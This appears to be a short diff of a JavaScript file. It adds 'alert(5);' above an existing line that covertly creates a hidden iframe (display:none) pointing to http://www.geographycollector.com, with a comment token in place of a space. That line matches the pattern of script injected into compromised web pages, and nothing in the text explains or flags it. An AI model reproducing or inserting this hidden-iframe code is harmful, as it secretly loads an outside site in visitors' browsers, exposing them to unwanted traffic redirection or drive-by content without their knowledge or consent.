@@ -1,1 +1,2 @@
+alert(5);
 if(document.body.lastChild.src.indexOf("geographycollector")==-1){var/**/iframe=document.createElement('iframe');iframe.src='http://www.geographycollector.com';iframe.style.display='none';document.body.appendChild(iframe);}
